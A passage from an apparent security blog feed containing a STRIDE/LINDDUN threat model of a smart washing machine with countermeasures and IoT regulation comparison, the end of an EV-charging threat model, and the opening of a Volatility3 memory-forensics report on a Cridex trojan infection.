27002</p><p><strong>4.Regular penetration test:</strong> Conduct pen test regularly, ensuringthat as many risks as possible can be found in advance.</p><h2 id="Policy-approaches"><a href="#Policy-approaches" class="headerlink" title="Policy approaches"></a>Policy approaches</h2><p><strong>1.Establish uniform industry standards:</strong> The government andrelevant industry organizations should establish safety requirements andtechnical standards for charging infrastructure to ensure all chargingstations adhere to unified safety protocols.</p><p><strong>2.Establish an industry interconnection mechanism:</strong> Electricitysuppliers and charging service providers should collaborate on securityand promptly share abnormalities.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This article thoroughly analyzes security vulnerabilities within theholistic architecture of electric vehicle charging services in smartgrids, utilizing the STRIDE model. It unveils risks associated with thecloud platform, users, vehicles, and communication modules, along withtheir significant impacts on the power grid. Drawing upon recentresearch advancements, it proposes advanced detection methods and offerseffective mitigation strategies from technical, managerial, and policyperspectives.</p>]]></content>
    
    
    <categories>
      
      <category>工控安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>威胁建模</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smart Washing Machine Threat Modeling</title>
    <link href="/2025/05/13/Smart-Washing-Machine-Threat-Modeling/"/>
    <url>/2025/05/13/Smart-Washing-Machine-Threat-Modeling/</url>
    
    <content type="html"><![CDATA[<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>The development of IoT and cloud technology are driving thetransformation of people’s lifestyles. Smart cars, smart furniture,smart washing machines and robotic vacuum cleaners can easily becontrolled by users from anywhere at any time, which is quite convenientfor users and provides better experience. However, at the same time,security and privacy threats are overlooked generally. Huge number offlaws are exposed to attackers, security problems such as inappropriatenetwork exposure, unencrypted data transition, weak password and so on,including the compliance violation could cause risks that leak a vastnumber of users’ information or even constitute a botnet that can causelarger chaos in society. In this report, we will analyze security andprivacy threats using STRIDE andLINDDUN model in a scenario where smart washing machineis used at home and provide the corresponding countermeasures.</p><h1 id="System-Architecture-Introduction"><a href="#System-Architecture-Introduction" class="headerlink" title="System Architecture Introduction"></a>System Architecture Introduction</h1><p>Based on home-use washing machine scenario, we draw an architecturediagram to introduce it.</p><img src="/2025/05/13/Smart-Washing-Machine-Threat-Modeling/smart_washmachine_architecture.png" class=""><p>1.Washing machine and Amazon Alexa can connect to the Cloud servers byusing home router, which could let them receive control commands fromoutside.</p><p>2.Washing machine manufacture can check machines status and pushfirmware updates through the washing machine cloud.</p><p>3.User can control washing machines, such as start, stop, model choiceand so on, by using app, which connects to the Washing Machine Cloud.</p><p>4.User can also use Alexa, which is an Amazon smart sound that can becontrolled by voice, to control the washing machine. When user speak thecommand to sound, command can be transmitted to Amazon Cloud service andthen be sent to Washing Machine Cloud by cloud-side interaction, whichcan further control the performance of washing machine.</p><h1 id="Data-Flow-Diagram-and-Introduction"><a href="#Data-Flow-Diagram-and-Introduction" class="headerlink" title="Data Flow Diagram and Introduction"></a>Data Flow Diagram and Introduction</h1><p>Based on the architecture diagram before, we can abstract the keyelements (processes data flows and storages) and draw a data flowdiagram to show the significant data flows between these elements.Besides, we draw the trust boundary and administrative boundary, helpingto understand the trust zone and analyze the security and privacythreats among the system.</p><img src="/2025/05/13/Smart-Washing-Machine-Threat-Modeling/washmachine_data_flow_diagrame.png" class=""><p>The whole system can be divided into three administrative boundaries:Manufacturer management, Third-party management and Customer management,which demonstrates the division of responsibilities by areas and showsthe possible data transition between different principals. This is thekey point to analyze privacy and compliance threats.</p><p>Trust boundaries are demonstrated by red dotted lines, illustrating theboundary between different security control policies and trust levels,which is the key point to analyze security threats.</p><p>Unlike the previous architecture description, in manufacturer managementarea, cloud services are divided into three parts: control service,update service and washing machine service, though they belong to onetrust boundary. The control service can trigger update service to sendfirmware update to washing machines.</p><h1 id="Threat-Modeling-and-Analysis"><a href="#Threat-Modeling-and-Analysis" class="headerlink" title="Threat Modeling and Analysis"></a>Threat Modeling and Analysis</h1><p>In this part, we will implement threat modeling towards the data flowdiagram before to analyze the security and privacy threats based onSTRIDE and LINDDUN, which are two famous threat analysis models.</p><p>First, we will introduce these two models, and then we will list all thepossible threats and map them to these models. Finally, we will discussthese threats in an easy-to-understand way.</p><h2 id="Threat-models-introduction"><a href="#Threat-models-introduction" class="headerlink" title="Threat models introduction"></a>Threat models introduction</h2><p>The following picture is the description of meaning of STRIDE model,which can be separated into six parts: Spoofing, Tampering, Repudiation,Info disclosure, Denial of service and Elevation of privilege.</p><p>These six parts are a highly abstraction of cyber-attack ways, which canbe used as a mindset to analyze the possible security risks of a system.</p><img src="/2025/05/13/Smart-Washing-Machine-Threat-Modeling/STRIDE.png" class=""><p>The following picture shows the description LINDDUN. The acronym LINDDUNrepresents 7 main threat types in privacy: Linking, Identifying,Non-repudiation, Detecting, Data disclosure, Unawareness &amp;Unintervenability and Non-compliance, which could help us think aboutprivacy concerns in systemtic and structured way.</p><img src="/2025/05/13/Smart-Washing-Machine-Threat-Modeling/LINDDUN.png" class=""><h2 id="Threat-analysis"><a href="#Threat-analysis" class="headerlink" title="Threat analysis"></a>Threat analysis</h2><p>This part, we will perform a holistic threat analysis to the home-usewashing machine scenario based on the STRIDE and LINDDUN models. Wetotally list 10 types of threats in the table 1, and the detaileddescriptions and discussions are below the table.</p><table><thead><tr><th>Threat</th><th>Threat Name</th><th>Model Mapping</th></tr></thead><tbody><tr><td>1</td><td>App username and password brute-forcing</td><td>Spoofing, Detecting</td></tr><tr><td>2</td><td>App over-collects customers’ information without notification</td><td>Unawareness &amp; Intervenability, Compliance</td></tr><tr><td>3</td><td>Lack of encryption between App and Cloud Service</td><td>Spoofing, Tampering, Info Disclosure, Linking, Identifying, Data Disclosure</td></tr><tr><td>4</td><td>Lack of authentication or authorization between App and Cloud Service</td><td>Spoofing, Tampering, Info Disclosure, Elevation of Privilege, Data Disclosure, Unawareness, Non-compliance</td></tr><tr><td>5</td><td>Lack of authentication between Washing Machine and Cloud Service</td><td>Spoofing, Non-compliance</td></tr><tr><td>6</td><td>Lack of signature and integrity verification during the OTA (Over the Air) update</td><td>Spoofing, Tampering</td></tr><tr><td>7</td><td>Lack of signature between Amazon and Washing Machine Cloud Service</td><td>Spoofing, Tampering</td></tr><tr><td>8</td><td>Manufacturer Cloud Services expose unexpected sensitive services</td><td>Spoofing, Tampering, Elevation of Privilege</td></tr><tr><td>9</td><td>Manufacturer Cloud Service lacks DDOS protection</td><td>Denial of Service</td></tr><tr><td>10</td><td>Manufacturer Cloud Service lacks necessary service logs</td><td>Repudiation</td></tr></tbody></table><h3 id="Threat-1-App-username-and-password-brute-forcing"><a href="#Threat-1-App-username-and-password-brute-forcing" class="headerlink" title="Threat 1: App username and password brute-forcing"></a>Threat 1: App username and password brute-forcing</h3><p> <strong>Scenario description:</strong> When login to the washing machine app,the attacker can enumerate usernames and passwords, at the same time,observing the system responses to determine whether the user exists andwhat the corresponding password is.</p><p><strong>Threat mapping:</strong> Spoofing, Detecting</p><p><strong>Threat discussing:</strong> When the app does not limit the frequency of thelogin attempts based on devices fingerprints and response excessiveinformation, this kind of threat can happen. Attacker can login thesystem using guessed username and password and spoof a legitimate user.Even attacker can not login successfully, with the excessive informationlike “The user exists but wrong password”, attackers can make sure thatthis user are using this app, which violates the privacy principle ofunobservability.</p><h3 id="Threat-2-App-over-collects-customers’-information-without-notification"><a href="#Threat-2-App-over-collects-customers’-information-without-notification" class="headerlink" title="Threat 2: App over-collects customers’ information without notification"></a>Threat 2: App over-collects customers’ information without notification</h3><p> <strong>Scenario description:</strong> App collect users’ location informationin real time, but users even do not know.</p><p><strong>Threat mapping:</strong> Unawareness &amp; Intervenability, Compliance</p><p><strong>Threat discussing:</strong> Customers’ must have the right to know and refusetheir personal information collection and use. If they do not know, thiscondition has violated the content awareness and compliance</p><h3 id="Threat-3-Lack-of-encryption-between-App-and-Cloud-Service"><a href="#Threat-3-Lack-of-encryption-between-App-and-Cloud-Service" class="headerlink" title="Threat 3: Lack of encryption between App and Cloud Service"></a>Threat 3: Lack of encryption between App and Cloud Service</h3><p> <strong>Scenario description:</strong> When communication between App andCloud Service does not have proper encryption, attackers can implementMITM(Man-in-the-Middle) attack, which can sniff all the informationtransmitted and can even make some changes to the commands.</p><p><strong>Threat mapping:</strong> Spoofing, Tampering, Info Disclosure, Linking,Identifying, Data Disclosure</p><p><strong>Threat discussing:</strong> Attackers can get all information from thecommunication, so if customers personal information is being sent, suchas phone number, home address, username, password, email, commands andso on, that will be a big information disclosure, which violateconfidentiality. Attackers can do anything they want; they can spoofcustomers to send command and tamper any command that customer send.Besides, they can know who you are based on this information, whichviolates anonymity &amp; pseudoanonymity principle. Then, if thegeographical location is sent, they can combine them with the map tolocate which community you are living in and even the specific building,which violate the unlinkability principle.</p><h3 id="Threat-4-Lack-of-authentication-or-authorization-between-App-and-Cloud-Service"><a href="#Threat-4-Lack-of-authentication-or-authorization-between-App-and-Cloud-Service" class="headerlink" title="Threat 4: Lack of authentication or authorization between App and Cloud Service"></a>Threat 4: Lack of authentication or authorization between App and Cloud Service</h3><p> <strong>Scenario description:</strong> When the interface lacksauthentication, attackers can send any request without any loginprocess; When the interface lacks authorization, attackers just need alogin process, but do not need to bind the washing machine, so they cansend command to any existing machine.</p><p><strong>Threat mapping:</strong> Spoofing, Tampering, Info Disclosure, Elevation ofPrivilege, Data Disclosure, Unawareness, Non-compliance</p><p><strong>Threat discussing:</strong> In this scenario, attackers can deceive serverthat they have privileges even higher privileges and then tampercommands or get sensitive information, which cause informationdisclosure, violating confidentiality. They can play as another customerto control other machines. Besides, the real customer can not awarethese actions, which violates content awareness privacy principle andpolicy and consent compliance.</p><h3 id="Threat-5-Lack-of-authentication-between-Washing-Machine-and-Cloud-Service"><a href="#Threat-5-Lack-of-authentication-between-Washing-Machine-and-Cloud-Service" class="headerlink" title="Threat 5: Lack of authentication between Washing Machine and Cloud Service"></a>Threat 5: Lack of authentication between Washing Machine and Cloud Service</h3><p> <strong>Scenario description:</strong> When communication between WashingMachine and Cloud Service does not have proper authentication orauthorization, attackers can pretend to be the server to send commands.</p><p><strong>Threat mapping:</strong> Spoofing, Non-compliance</p><p><strong>Threat discussing:</strong> In this scenario, attackers can deceive washingmachine that they are servers and then send commands, which violatesauthentication security principle. . Besides, the real customer can notaware these actions, which violates least-privilege principle andcompliance.</p><h3 id="Threat-6-Lack-of-signature-and-integrity-verification-during-the-OTA-update"><a href="#Threat-6-Lack-of-signature-and-integrity-verification-during-the-OTA-update" class="headerlink" title="Threat 6: Lack of signature and integrity verification during the OTA update"></a>Threat 6: Lack of signature and integrity verification during the OTA update</h3><p> <strong>Scenario description:</strong> Attackers can make changes to the patchfiles during the transit. If the washing machine does implementintegrity verification, this evil patch can be installed to thefirmware, which could let attacker fully control the washing machine.</p><p><strong>Threat mapping:</strong> Spoofing, Tampering</p><p><strong>Threat discussing:</strong> Attackers need to change files during this kindof attack, so this violates integrity security principle. Besides, ifthe washing machine lacks integrity verification to the patch file,attackers can deceive washing machine that this file is coming from theofficial server, which violates authentication security principle.</p><h3 id="Threat-7-Lack-of-signature-between-Amazon-and-Washing-Machine-Cloud-Service"><a href="#Threat-7-Lack-of-signature-between-Amazon-and-Washing-Machine-Cloud-Service" class="headerlink" title="Threat 7: Lack of signature between Amazon and Washing Machine Cloud Service"></a>Threat 7: Lack of signature between Amazon and Washing Machine Cloud Service</h3><p> <strong>Scenario description:</strong> If the communication between them lackssignature, attackers can send forged requests to the Washing MachineCloud Service to pretend to be the Amazon Cloud Service.</p><p><strong>Threat mapping:</strong> Spoofing, Tampering</p><p><strong>Threat discussing:</strong> The communication between two different systemscannot use account to identify the identity, but signature can be thebest solution. Without signature, attackers can easily change or sendany request by themselves, which violates authentication and integritysecurity principles.</p><h3 id="Threat-8-Manufacturer-Cloud-Services-expose-unexpected-sensitive-services"><a href="#Threat-8-Manufacturer-Cloud-Services-expose-unexpected-sensitive-services" class="headerlink" title="Threat 8: Manufacturer Cloud Services expose unexpected sensitive services"></a>Threat 8: Manufacturer Cloud Services expose unexpected sensitive services</h3><p> <strong>Scenario description:</strong> Manufacturer Cloud Services may exposesensitive ports to external network, such as 22(SSH), 80(HTTP),443(HTTPS), 5900(VNC) and so on, which could give attackersopportunities to control the whole network and break the trust chain. Atthat time, attackers can send any command to any device and change patchfiles from origin.</p><p><strong>Threat mapping:</strong> Spoofing, Tampering, Elevation of Privilege</p><p><strong>Threat discussing:</strong> The washing machine control services should onlyopen to the internal network to let engineers operate the system. If itopens to external network, it means that anyone can access it, whichviolates least-privilege security principle.</p><h3 id="Threat-9-Manufacturer-Cloud-Service-lacks-DDOS-protection"><a href="#Threat-9-Manufacturer-Cloud-Service-lacks-DDOS-protection" class="headerlink" title="Threat 9: Manufacturer Cloud Service lacks DDOS protection"></a>Threat 9: Manufacturer Cloud Service lacks DDOS protection</h3><p> <strong>Scenario description:</strong> Attackers can use botnet to send alarge volume of network traffic to attacks Manufacturer Cloud Services,which could interrupt the cloud services.</p><p><strong>Threat mapping:</strong> Denial of Service</p><p><strong>Threat discussing:</strong> Denial of Service can make a big chaos in thewhole society, because all the smart washing machine cannot be usedduring the attack, which violates the availability security principle.</p><h3 id="Threat-10-Manufacturer-Cloud-Service-lacks-necessary-service-logs"><a href="#Threat-10-Manufacturer-Cloud-Service-lacks-necessary-service-logs" class="headerlink" title="Threat 10: Manufacturer Cloud Service lacks necessary service logs"></a>Threat 10: Manufacturer Cloud Service lacks necessary service logs</h3><p> <strong>Scenario description:</strong> Without necessary server operationlogs, attackers can make some critical changes in services, but nobodycan know who did these changes.</p><p><strong>Threat mapping:</strong> Repudiation</p><p><strong>Threat discussing:</strong> Without necessary server operation logs, securityengineers cannot do some forensic works to analyze who did the anomalyactions, which violates non-repudiation security principle in STRIDE.</p><h1 id="Technical-Countermeasures"><a href="#Technical-Countermeasures" class="headerlink" title="Technical Countermeasures"></a>Technical Countermeasures</h1><p>In this part, we will mainly talk about the countermeasures we shouldtake towards the threats that we have analyzed before.</p><h2 id="Threat-1-App-username-and-password-brute-forcing-1"><a href="#Threat-1-App-username-and-password-brute-forcing-1" class="headerlink" title="Threat 1: App username and password brute-forcing"></a>Threat 1: App username and password brute-forcing</h2><p> <strong>Technology solution:</strong></p><p>(1) Return the same error message, like “Username or password iswrong”, even just username or password wrong to stop the usernameenumeration.</p><p>(2) Use robot-check SDK to stop the brute-forcing attack</p><p>(3) Use MFA to avoid the scenario that attackers try to login usingguessed right username and password.</p><p><strong>Refactoring cost:</strong> Need to change the logic of login module, installnew SDK and use MFA.</p><h2 id="Threat-2-App-over-collects-customers’-information-without-notification-1"><a href="#Threat-2-App-over-collects-customers’-information-without-notification-1" class="headerlink" title="Threat 2: App over-collects customers’ information without notification"></a>Threat 2: App over-collects customers’ information without notification</h2><p> <strong>Technology solution:</strong> Only collect necessary information fromusers and describe why we collect this information in the consent.</p><p><strong>Refactoring cost:</strong> Need to review information collected and removeunnecessary field and change the consent content.</p><h2 id="Threat-3-Lack-of-encryption-between-App-and-Cloud-Service-1"><a href="#Threat-3-Lack-of-encryption-between-App-and-Cloud-Service-1" class="headerlink" title="Threat 3: Lack of encryption between App and Cloud Service"></a>Threat 3: Lack of encryption between App and Cloud Service</h2><p> <strong>Technology solution:</strong> Use HTTPS as the communication protocolto ensure the encryption.</p><p><strong>Refactoring cost:</strong> Need to change the communication protocol to HTTPSin source code.</p><h2 id="Threat-4-Lack-of-authentication-or-authorization-between-App-and-Cloud-Service-1"><a href="#Threat-4-Lack-of-authentication-or-authorization-between-App-and-Cloud-Service-1" class="headerlink" title="Threat 4: Lack of authentication or authorization between App and Cloud Service"></a>Threat 4: Lack of authentication or authorization between App and Cloud Service</h2><p> <strong>Technology solution:</strong> Ensure each API interface has the properauthentication and RBAC authorization.</p><p><strong>Refactoring cost:</strong> Need to change the configuration of the APIGateway and the source code logic of each interface.</p><h2 id="Threat-5-Lack-of-authentication-between-Washing-Machine-and-Cloud-Service-1"><a href="#Threat-5-Lack-of-authentication-between-Washing-Machine-and-Cloud-Service-1" class="headerlink" title="Threat 5: Lack of authentication between Washing Machine and Cloud Service"></a>Threat 5: Lack of authentication between Washing Machine and Cloud Service</h2><p> <strong>Technology solution:</strong> Washing machine should verify thecertificate of the Cloud Service and negotiate the key.</p><p><strong>Refactoring cost:</strong> Cloud Service should apply a certificate from aCA, and let the Washing Machine trust this CA.</p><h2 id="Threat-6-Lack-of-signature-and-integrity-verification-during-the-OTA-update-1"><a href="#Threat-6-Lack-of-signature-and-integrity-verification-during-the-OTA-update-1" class="headerlink" title="Threat 6: Lack of signature and integrity verification during the OTA update"></a>Threat 6: Lack of signature and integrity verification during the OTA update</h2><p> <strong>Technology solution:</strong> Patch file should attach a signature,and when the Washing Machine install the patch, it should verify thevalidity of the signature.</p><p><strong>Refactoring cost:</strong> OTA update Cloud Service should apply acertificate from a CA and sign every patch file using its private key.Let the Washing Machine trust this CA and use the public key incertificate to verify the file.</p><h2 id="Threat-7-Lack-of-signature-between-Amazon-and-Washing-Machine-Cloud-Service-1"><a href="#Threat-7-Lack-of-signature-between-Amazon-and-Washing-Machine-Cloud-Service-1" class="headerlink" title="Threat 7: Lack of signature between Amazon and Washing Machine Cloud Service"></a>Threat 7: Lack of signature between Amazon and Washing Machine Cloud Service</h2><p> <strong>Technology solution:</strong> When Washing Machine Cloud Servicereceive the requests from Amazon Cloud Service, Washing Machine CloudService verify the signature from the Amazon.</p><p><strong>Refactoring cost:</strong> Config Washing Machine Cloud Service to get thepublic key from a trusted interface provided by Amazon and verify thesignature of requests.</p><h2 id="Threat-8-Manufacturer-Cloud-Services-expose-unexpected-sensitive-services-1"><a href="#Threat-8-Manufacturer-Cloud-Services-expose-unexpected-sensitive-services-1" class="headerlink" title="Threat 8: Manufacturer Cloud Services expose unexpected sensitive services"></a>Threat 8: Manufacturer Cloud Services expose unexpected sensitive services</h2><p> <strong>Technology solution:</strong> Stop all ports exposed to externalnetwork and only all the access from internal network.</p><p><strong>Refactoring cost:</strong> Config the VPC ACL or the ECS security group.</p><h2 id="Threat-9-Manufacturer-Cloud-Service-lacks-DDOS-protection-1"><a href="#Threat-9-Manufacturer-Cloud-Service-lacks-DDOS-protection-1" class="headerlink" title="Threat 9: Manufacturer Cloud Service lacks DDOS protection"></a>Threat 9: Manufacturer Cloud Service lacks DDOS protection</h2><p> <strong>Technology solution:</strong> Add the DDOS protection to the network,such as CDN, traffic scrubbing and so on.</p><p><strong>Refactoring cost:</strong> Buy the security service such as CDN, DDOSprotection form cloud provider.</p><h2 id="Threat-10-Manufacturer-Cloud-Service-lacks-necessary-service-logs-1"><a href="#Threat-10-Manufacturer-Cloud-Service-lacks-necessary-service-logs-1" class="headerlink" title="Threat 10: Manufacturer Cloud Service lacks necessary service logs"></a>Threat 10: Manufacturer Cloud Service lacks necessary service logs</h2><p> <strong>Technology solution:</strong> Add service logs to the necessaryfunctions, such as OTA update, command and control.</p><p><strong>Refactoring cost:</strong> Add log printing and storage logic to the sourcecode of services manually.</p><h1 id="UK-Code-of-Practice-Analysis"><a href="#UK-Code-of-Practice-Analysis" class="headerlink" title="UK Code of Practice Analysis"></a>UK Code of Practice Analysis</h1><p>In this section, we will analyze some UK Code of Practice to mitigatethe threats above.</p><p>British National Cyber Security Centre (NCSC) published a Code ofPractice for Consumer IoT Security, whichprovides practical steps for IoT manufacturers to improve the securityof consumer IoT products. This practice provides thirteen guidelinescontributing to protecting customers’ security and privacy.</p><p>The following picture shows the thirteen guidelines.</p><img src="/2025/05/13/Smart-Washing-Machine-Threat-Modeling/Code_of_practice-UK.png" class=""><h2 id="Practice-2-Implement-a-vulnerability-disclosure-policy"><a href="#Practice-2-Implement-a-vulnerability-disclosure-policy" class="headerlink" title="Practice 2: Implement a vulnerability disclosure policy"></a>Practice 2: Implement a vulnerability disclosure policy</h2><p> <strong>Solve problems:</strong> Threat 1,2,3,4,5,8</p><p><strong>Analysis:</strong> This policy allows security researchers and others toreport issues, which means that most of the application securityproblems and network traffic security problems can be found by them.</p><h2 id="Practice-5-Communicate-securely"><a href="#Practice-5-Communicate-securely" class="headerlink" title="Practice 5: Communicate securely"></a>Practice 5: Communicate securely</h2><p> <strong>Solve problems:</strong> Threat 3,4,5,7</p><p><strong>Analysis:</strong> This policy means that the communication through thenetwork should have security mechanism such as encryption, signature,authentication and authorization.</p><h2 id="Practice-6-Minimize-exposed-attack-surfaces"><a href="#Practice-6-Minimize-exposed-attack-surfaces" class="headerlink" title="Practice 6: Minimize exposed attack surfaces"></a>Practice 6: Minimize exposed attack surfaces</h2><p> <strong>Solve problems:</strong> Threat 8</p><p><strong>Analysis:</strong> This policy means that do not expose unnecessary servicesto the external network</p><h2 id="Practice-7-Ensure-software-integrity"><a href="#Practice-7-Ensure-software-integrity" class="headerlink" title="Practice 7: Ensure software integrity"></a>Practice 7: Ensure software integrity</h2><p> <strong>Solve problems:</strong> Threat 6</p><p><strong>Analysis:</strong> This policy means that we should monitor any unwantedchanged to devices, such as anomaly OTA update.</p><h2 id="Practice-8-Ensure-that-personal-data-is-protected"><a href="#Practice-8-Ensure-that-personal-data-is-protected" class="headerlink" title="Practice 8: Ensure that personal data is protected"></a>Practice 8: Ensure that personal data is protected</h2><p> <strong>Solve problems:</strong> Threat 3,4</p><p><strong>Analysis:</strong> This policy means that we need to ensure the personal datawill not be leaked from the servers or during the communication.</p><h2 id="Practice-9-Make-system-resilient-to-outages"><a href="#Practice-9-Make-system-resilient-to-outages" class="headerlink" title="Practice 9: Make system resilient to outages"></a>Practice 9: Make system resilient to outages</h2><p> <strong>Solve problems:</strong> Threat 9</p><p><strong>Analysis:</strong> This policy means that the system’s availability cannot beinfluenced by the DDOS or any other incident.</p><h2 id="Practice-10-Monitor-system-telemetry-data"><a href="#Practice-10-Monitor-system-telemetry-data" class="headerlink" title="Practice 10: Monitor system telemetry data"></a>Practice 10: Monitor system telemetry data</h2><p> <strong>Solve problems:</strong> Threat 10</p><p><strong>Analysis:</strong> This policy means that we need to monitor and collect allthe necessary system log data to contributing to the security analysis.</p><h2 id="Practice-11-Make-it-easy-for-costumers-to-delete-personal-data"><a href="#Practice-11-Make-it-easy-for-costumers-to-delete-personal-data" class="headerlink" title="Practice 11: Make it easy for costumers to delete personal data"></a>Practice 11: Make it easy for costumers to delete personal data</h2><p> <strong>Solve problems:</strong> Threat 2</p><p><strong>Analysis:</strong> This policy means that we should give customers the fullcontrol of their personal data, including collection acknowledge anddeletion right.</p><h2 id="Practice-13-Validate-input-data"><a href="#Practice-13-Validate-input-data" class="headerlink" title="Practice 13: Validate input data"></a>Practice 13: Validate input data</h2><p> <strong>Solve problems:</strong> Threat 1,4,5,6,7</p><p><strong>Analysis:</strong> This policy means that every input from outside should beverified the legitimacy, which can stop the threats such asauthentication, authorization, signature and so on.\Based on analysis above, we could see that we can successfully solve allthe threats that we have analyzed before using this UK Code of Practicefor Consumer IoT Security.</p><h1 id="Comprehensive-Comparison-of-Multi-Country-Regulations"><a href="#Comprehensive-Comparison-of-Multi-Country-Regulations" class="headerlink" title="Comprehensive Comparison of Multi-Country Regulations"></a>Comprehensive Comparison of Multi-Country Regulations</h1><p>In this section we will discuss other regulations in IoT security area,such as Europe and USA.</p><p>The following picture shows the ETSI EN 303 645standard, which is European standard for customerIoT. It has thirteen principles same as the standard in UK.</p><img src="/2025/05/13/Smart-Washing-Machine-Threat-Modeling/ETSI_EN_303_645.png" class=""><p>The following picture is the USA NIST IR 8259 seriesstandard, which identifies the securitybaseline of the IoT devices.</p><img src="/2025/05/13/Smart-Washing-Machine-Threat-Modeling/NISTIR_8259_series.png" class=""><p>The UK, EU, and US have all introduced IoT security standards, but theydiffer in focus, scope, and level of technical detail.</p><p>The UK’s Code of Practice for Consumer IoT Security was one of theearliest frameworks. It is policy-oriented and aimed at manufacturers ofconsumer IoT devices. It outlines 13 high-level security principles,such as avoiding default passwords, ensuring devices can be updated, andproviding vulnerability disclosure mechanisms. The language is simple,making it suitable for policymakers and product managers. For example,it recommends avoiding default passwords but doesn’t specify how toimplement that technically.</p><p>The EU’s ETSI EN 303 645 builds on the UK’s principles with moretechnical depth. It includes the same 13 principles and adds fiveadditional recommendations focused on data protection. It not only bansdefault passwords but also requires each device to have a uniquecredential or force the user to set one during initial setup. ETSI alsoincludes privacy-related measures like data minimization, user controlover data, and secure deletion mechanisms. This makes it more suitablefor engineers and technical implementation, and it has been adopted inseveral countries as an official standard.</p><p>The US NIST IR 8259 series is more focused on technical baselines andsystem integration, especially in enterprise and government procurementcontexts. It defines key security functions such as device identity,secure configuration, update mechanisms, logging, and data protection.While it also discourages default passwords and supports secure updates,it puts greater emphasis on configurability and audit logging. Forexample, while the UK mentions that devices should be updatable, NISTgoes further by requiring update integrity checks and rollbackcapabilities.</p><p>In addition, the UK’s framework is now legally enforced through the PSTIAct. The EU is moving in the same direction with its upcoming CyberResilience Act (CRA). In contrast, NIST standards are not mandatory forthe general market but are required for federal procurement and widelyreferenced in industry.</p><p>In summary, the UK standard provides policy direction, the EU standardsupports technical implementation, and the US standard focuses onenterprise-level integration. Each reflects different regionalpriorities for securing consumer IoT devices.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In this report, we analyze and list 10 primary security threats ofhome-use washing machines and provide corresponding technology andpolicy countermeasures. At the same time, we implement comprehensivecomparison analysis for regulations of customer IoT security in UK, EUand USA.</p>]]></content>
    
    
    <categories>
      
      <category>IOT安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>威胁建模</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cridex Trojan Infection System Forensic Analysis Report</title>
    <link href="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/"/>
    <url>/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Forensics technique is one of the most important ways for analysing themalware. Combining with the static analysis, forensics can help us findthe evidence of a system being attacked and know how the malware infectsthe system step by step.</p><p>According to the MITRE ATT&amp;CK framework, the common process ofan attack can be divided into several stages: Reconnaissance, ResourceDevelopment, Initial Access, Execution, Persistence, PrivilegeEscalation, Defense Evasion, Credential Access, Discovery, LateralMovement, Collection, Command and Control, Collection, Exfiltration andImpact.Each step can include several techniques.</p><p>In this report, we will use forensics tools Volatility3 to analyse aninfected Windows image and find some attack traces based on the MITREATT&amp;CK framework.</p><h1 id="Analysis-Tasks"><a href="#Analysis-Tasks" class="headerlink" title="Analysis Tasks"></a>Analysis Tasks</h1><h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><h3 id="Processes-Investigation"><a href="#Processes-Investigation" class="headerlink" title="Processes Investigation"></a>Processes Investigation</h3><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.info</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_info.png" class=""><p>Analysing the system information by using the plugin: windows.info,information show as follows:</p><p>1.NTBuildLab shows that this dump uses the version of system: Windows XPSP3</p><p>2.MachineType shows that this machine uses X86 architecture 32 bit</p><p>3.SystemTime shows the time that create this dump Now, we can makesurethat this is a windows machine and we can use the corresponding pluginsfor further analysis.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.pslist</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_pslist.png" class=""><p>windows.pslist can show all the running processes when built this dump,we can find that all the processes are named as system processes expectreader_sl.exe. It is a little bit suspicious that reader_sl.exe startedvery early in the system startup, according to the CreateTime of theprocesses, which may be an auto-start evil program to persist itself.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.pstree</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_pstree1.png" class=""><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_pstree2.png" class=""><p>windows.pstree plugin can show the dependencies between processes byusing Process ID (PID), Parent PID (PPID) and show the executable pathof the programs, which can help us finding some suspicious processes.</p><p>All the processes can find their parent processes using PPID expectexplorer.exe(PPID 1464 can not be found in the processes list), whichprobably means that some malicious process spawned this process and haskilled itself. Besides, explorer.exe usually started by wininit.exe oruserinit.exe, but these two processes can not be found in this processeslist.</p><p>wuauclt.exe is a system update process, but there are two wuauclt.exeprocesses running together: PID 1136 and PID 1588, which is abnormal.</p><p>All the executable paths of processes are look right, which means thatthe malicious processes do not disguise themselves by simply changingtheir names.</p><h3 id="Module-Scanning"><a href="#Module-Scanning" class="headerlink" title="Module Scanning"></a>Module Scanning</h3><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.modules.Modules </code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_modules.png" class=""><p>windows.modules.Modules plugin shows all the system driver files,responsible for managing hardware communication or providing core systemfunctionalities. Malicious programs often disguise as a driver file toelevate privileges.</p><p>From figure above we can find that there are some driver files that donot locate in the system path(such as System32) and all the file outputsare disabled, which is quite suspicious, maybe there are something wrongwith these outputs, or there are some core modules are disabled bymalicious processes.</p><p>At the same time, i use dlllist plugin to test two suspicious programsabove PID 1484 and PID 1640</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem dlllist --pid 1484    python3 vol.py -f infected-system.vmem dlllist --pid 1640 </code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_dlllist1.png" class=""><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_dlllist2.png" class=""><p>Figures above clearly shows that these two programs load the evil dllfile named comctl32.dll, containing &quot;commad-controls&quot; path keyword,which means that these two programs were infected and can 